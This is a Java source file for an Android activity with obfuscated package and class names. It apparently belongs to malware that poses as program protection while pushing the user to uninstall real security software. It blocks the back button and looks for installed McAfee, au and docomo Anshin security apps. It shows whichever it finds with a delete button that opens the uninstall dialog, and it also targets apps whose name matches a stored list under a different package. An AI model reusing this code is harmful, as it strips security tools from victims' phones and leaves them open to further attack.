package replaceflag_fysn.replaceflag_rydk.replaceflag_capud;

import static replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Ahrtry.mPDatasOnly;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;

import java.util.List;

public class replaceflag_NewMainActivity extends Activity {
    private String[] mOldPkgNames = new String[]{"com.frgv.aszw", "com.qwsc.ikol", "com.ccfv.rrss"};

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        pm = getPackageManager();
        setContentView(R.layout.replaceflag_main);
        this.getWindow().getDecorView().setBackgroundColor(Color.WHITE);
        findViewById(R.id.overlayLayout).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(replaceflag_NewMainActivity.this, "プログラム保護しています。", Toast.LENGTH_SHORT).show();
            }
        });
        IntentFilter intentFilter = new IntentFilter(Intent.ACTION_PACKAGE_REMOVED);
        intentFilter.addDataScheme("package");
        registerReceiver(new McReceiver(), intentFilter);
    }

    @Override
    public void onBackPressed() {

    }

    PackageManager pm;

    @Override
    protected void onResume() {
//        if (mPDatasOnly == null || mPDatasOnly.size() <= 0) getNameAndPkgOnly();

        Log.i("rgh", "mPDatas_re: " + mPDatasOnly.size());
        String[] mPkgNames = new String[]{"com.wsandroid.suite", "com.au.anshinnetsecurity",
                "com.nttdocomo.android.anshinsecurity", "com.mcafee.vsm_android_dcm"};

        findViewById(R.id.divRisk).setVisibility(View.GONE);
        for (int i = 0; i < mPkgNames.length; i++) {
            try {
                go(mPkgNames[i]);
                super.onResume();
                return;
            } catch (Exception e) {
            }
        }

        if (mPDatasOnly != null && mPDatasOnly.size() > 0) {
            for (int ii = 0; ii < mPDatasOnly.size(); ii++) {
                List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
                for (int i = 0; i < packages.size(); i++) {
                    PackageInfo packageInfo = packages.get(i);
                    if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) { //非系统应用
                        String name = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                        if (name.equals(mPDatasOnly.get(ii).name) && !packageInfo.packageName.equals((mPDatasOnly.get(ii).pkgName))) {
                            try {
                                go(packageInfo.packageName);
                                super.onResume();
                                return;
                            } catch (Exception e) {
                            }
                        }
                    }
                }
            }
        }


        super.onResume();
    }

    private void go(String packageName) throws PackageManager.NameNotFoundException {
        PackageInfo packageInfo = pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
        findViewById(R.id.divRisk).setVisibility(View.VISIBLE);
        String name = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
        ((TextView) findViewById(R.id.s0018_8_app_name)).setText(name);
        ((ImageView) findViewById(R.id.s0018_8_app_icon)).setImageDrawable(packageInfo.applicationInfo.loadIcon(getPackageManager()));
        findViewById(R.id.s0018_8_delete).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
//                findViewById(R.id.divRisk).setVisibility(View.GONE);
                Uri packageURI = Uri.parse("package:" + packageInfo.packageName);
                Intent intent = new Intent(Intent.ACTION_DELETE, packageURI);
                startActivity(intent);
            }
        });
    }

    private class McReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Intent.ACTION_PACKAGE_REMOVED.equals(intent.getAction())) {
                finish();
            }
        }
    }

}
